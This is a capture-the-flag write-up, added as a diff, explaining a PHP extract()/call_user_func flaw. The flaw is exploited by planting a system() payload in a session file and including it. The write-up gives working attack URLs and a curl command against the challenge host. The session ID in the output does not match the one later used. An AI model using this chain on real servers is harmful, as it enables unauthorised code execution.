@@ -1,0 +1,104 @@
+#+TITLE: Advent of CTF - Challenge 21
+#+SUBTITLE: "Obscure Sessions"
+
+* Challenge
+
+Todays challenge is based on that of the XCTF Final 2018 BestPHP. I thought it was such a neat trick that I wanted to share it with you. The challenge is about the affects a well intended PHP ability can have. What you will learn:
+
+- The =call_user_func= function
+- The =extract= function
+- PHP sessions
+
+* Solution
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-21/index_att
+:END:
+
+The challenge starts with a listing of code. 
+
+#+CAPTION: Start of the challenge
+[[file:index_att/challenge-start.png]]
+
+The code that is listed is reproduced below. Most notably, in the first section =ini_set= is used to limit where PHP is allowed to read files. Next the =$function= is set to the parameter =function= from the URL. This function is passed to the =call_user_func= function, which according to the documentation does the following:
+
+#+begin_quote
+call_user_func — Call the callback given by the first parameter
+#+end_quote
+
+After that call, whatever is in the =$file= parameter will be included. The end of the function actually calls =start_session= to persist the =name= POST parameter for later use.
+
+#+CAPTION: The code from the challenge
+#+begin_src php
+<?php
+error_reporting(0);
+
+ini_set('display_errors', 0);
+ini_set('open_basedir', '/var/www/html:/tmp');
+
+# Make sure no evil things are passed in the URL
+$file = 'filters.php';
+$func = isset($_GET['function'])?$_GET['function']:'filters';
+call_user_func($func,$_GET);
+include($file);
+
+# Save the name for later
+session_start();
+if ($_POST["name"]){
+    $_SESSION["name"] = $_POST["name"];
+}
+
+header("Location: /index.php");
+exit();
+?>
+#+end_src
+
+so, how can this be leveraged? In PHP there is a function called =extract=. The documentation says the following about it:
+
+#+begin_quote
+extract — Import variables into the current symbol table from an array
+#+end_quote
+
+A little further down in the documentation is a warning about its use:
+
+#+begin_quote
+Warning Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).
+#+end_quote
+
+Why is this? Well, the function will "import" variables into the current scope from the array passed. So if an array is passed with a =file= key, that entry will overwrite whatever is in =$file=. To try this out, lets extract the =index.php= file using a =base64= encoder as we have used in the past.
+
+#+CAPTION: Extracting the index.php as Base64
+#+begin_src
+https://21.adventofctf.com/get_flag.php?function=extract&file=php://filter/convert.base64-encode/resource=index.php
+#+end_src
+
+Retrieving the flag will not work, as it is outside the base path. You will however find out that in =/tmp= the session files are stored. This can be leverated as you have the ability to add something to the session through the =name= post parameter. In the curl command below the PHP expression =<?== is called, which will echo the result of the function call inside of it, in this case the =system= call. You have to use =system= as it is not possible for regular PHP functions to read outside of the base path.
+
+#+CAPTION: Adding the payload
+#+begin_src
+curl -v -X POST -d "name=<?=system('cat /flag.txt');?>" https://21.adventofctf.com/get_flag.php
+#+end_src
+
+In the output it is important to note the =PHPSESSID=, as that session will contain the payload.
+
+#+CAPTION: Identifying the session
+#+begin_src
+< Set-Cookie: PHPSESSID=232acdf771eaf2d75c03d7ef31960ce9; path=/
+#+end_src
+
+The last step is to use =extract= to override the =file= variable and point it to the session that is stored with the payload.
+
+#+CAPTION: Invoking the payload
+#+begin_src
+https://21.adventofctf.com/get_flag.php?function=extract&file=/tmp/sess_dc0c104933094ad8d0afcf7d2a778cd9
+#+end_src
+
+It will end up printing the payload to the screen.
+
+#+CAPTION: The flag
+[[file:index_att/the-flag.png]]
+
+Be sure to also grab the badge!
+
+[[./index_att/badge.png]]
+
+Go back to the [[../../../index.org][homepage]].
